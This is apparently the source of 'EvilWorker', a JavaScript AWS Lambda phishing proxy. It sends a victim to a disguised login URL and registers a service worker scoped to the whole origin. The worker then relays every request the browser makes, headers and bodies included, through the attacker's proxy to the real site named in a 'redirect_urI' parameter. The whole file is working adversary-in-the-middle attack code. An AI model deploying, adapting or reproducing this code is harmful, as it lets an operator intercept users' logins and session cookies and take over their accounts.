const https = require("https");
const http = require("http");

// Simple proxy server for EvilWorker
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";

// Lambda handler
exports.handler = async (event, context) => {
    const { httpMethod, path, queryStringParameters, headers, body, isBase64Encoded } = event;
    
    console.log('Request:', { httpMethod, path, queryStringParameters });
    
    try {
        // Handle login URLs
        if (path.startsWith('/login') && queryStringParameters && queryStringParameters.redirect_urI) {
            const phishedURL = new URL(decodeURIComponent(queryStringParameters.redirect_urI));
            
            return {
                statusCode: 200,
                headers: {
                    'Content-Type': 'text/html',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type, Authorization'
                },
                body: getIndexHTML(phishedURL)
            };
        }

        // Handle service worker
        if (path === '/service_worker_Mz8XO2ny1Pg5.js') {
            return {
                statusCode: 200,
                headers: { 
                    'Content-Type': 'text/javascript',
                    'Service-Worker-Allowed': '/',
                    'Access-Control-Allow-Origin': '*'
                },
                body: getServiceWorkerJS()
            };
        }

        // Handle proxy requests
        if (path === '/proxy') {
            if (method === 'POST' && body) {
                const requestBody = isBase64Encoded ? Buffer.from(body, 'base64').toString() : body;
                const proxyRequest = JSON.parse(requestBody);
                
                const result = await makeProxyRequest(proxyRequest);
                return result;
            }
        }

        // Default response
        return {
            statusCode: 200,
            headers: { 'Content-Type': 'text/html' },
            body: '<h1>EvilWorker Proxy Server</h1><p>Server is running!</p>'
        };

    } catch (error) {
        console.error("Handler error", error);
        return {
            statusCode: 500,
            headers: { 'Content-Type': 'text/html' },
            body: '<h1>500 Internal Server Error</h1>'
        };
    }
};

async function makeProxyRequest(proxyRequest) {
    const targetURL = new URL(proxyRequest.url);
    const protocol = targetURL.protocol === 'https:' ? https : http;
    
    const options = {
        hostname: targetURL.hostname,
        port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
        path: targetURL.pathname + targetURL.search,
        method: proxyRequest.method,
        headers: {
            ...proxyRequest.headers,
            'host': targetURL.host
        }
    };

    return new Promise((resolve, reject) => {
        const req = protocol.request(options, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: {
                        'Content-Type': res.headers['content-type'] || 'text/html',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
                    },
                    body: data
                });
            });
        });

        req.on('error', (error) => {
            console.error('Proxy request error:', error);
            reject(error);
        });

        if (proxyRequest.body) {
            req.write(proxyRequest.body);
        }
        
        req.end();
    });
}

function getIndexHTML(phishedURL) {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EvilWorker</title>
</head>
<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
                .then((registration) => {
                    console.log("Service worker registered");
                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                    console.log("Redirecting to:", phishedURL.href);
                    self.location.replace(phishedURL.href);
                })
                .catch((error) => {
                    console.error("Service worker registration failed:", error);
                });
        }
        else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>
</html>`;
}

function getServiceWorkerJS() {
    return `self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = \`\${self.location.origin}/proxy\`;

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        const response = await fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
        
        return response;
    }
    catch (error) {
        console.error("Proxy request failed:", error);
        return new Response("Proxy request failed", { status: 500 });
    }
}`;
}